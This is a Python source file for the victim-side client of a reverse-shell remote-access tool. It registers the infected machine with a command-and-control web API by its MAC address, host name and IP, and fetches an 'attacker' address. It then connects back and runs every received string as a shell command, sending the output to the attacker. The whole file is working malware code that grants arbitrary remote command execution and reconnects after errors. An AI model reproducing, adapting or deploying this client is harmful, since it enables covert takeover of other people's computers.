import os
import re
import json
import uuid
import socket
import subprocess
from api import Client as Api


class Client(object):

    def __init__(self):
        self.host_name = socket.gethostname()
        self.host_ip = socket.gethostbyname(self.host_name)
        self.port = ''
        self.mac_address = self.get_mac_address()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.api = Api()
        # Change directory to 'Desktop'.
        # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.

    @staticmethod
    def get_mac_address():
        # joins elements of getnode() after each 2 digits.
        # using regex expression
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def connect_to_attacker(self):
        response = self.api.get_attacker(self.mac_address)
        while response.status_code != 200:
            response = self.api.get_attacker(self.mac_address)
        attacker = json.loads(response.text)
        attacker_ip = attacker['ip']
        attacker_port = attacker['port']
        self.connect_socket(attacker_ip, attacker_port)
        self.api.update_victim(self.mac_address, data={'port': self.client.getsockname()[1]})

    def connect_to_web_server(self):
        username = self.mac_address.replace(':', '')
        response = self.api.login(username, self.mac_address)
        if response.status_code == 401:
            self.api.register(username, self.mac_address)
        response = self.api.create_victim(self.host_ip, self.port, self.host_name, self.mac_address, username)
        if response.status_code == 400:
            self.api.update_victim(self.mac_address, data={'logged_in': True})
        self.connect_to_attacker()

    def connect_socket(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((ip, port))

    def main(self):
        while True:
            try:
                self.connect_to_web_server()
                while True:
                    data = self.client.recv(1024).decode('utf-8')
                    if data == 'quit':
                        print("quitting...")
                        self.client.close()
                    if data[:2] == 'cd':
                        os.chdir(data[3:])
                    if len(data) > 0:
                        command = subprocess.Popen(
                            data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                        )
                        output_bytes = command.stdout.read()
                        output_str = str(output_bytes, "utf-8")
                        self.client.send(str.encode(str(os.getcwd()) + '$ ' + '\n' + output_str))
            except:  # catch *all* exceptions
                self.client.close()
                self.api.logout()


if __name__ == '__main__':
    client = Client()
    client.main()
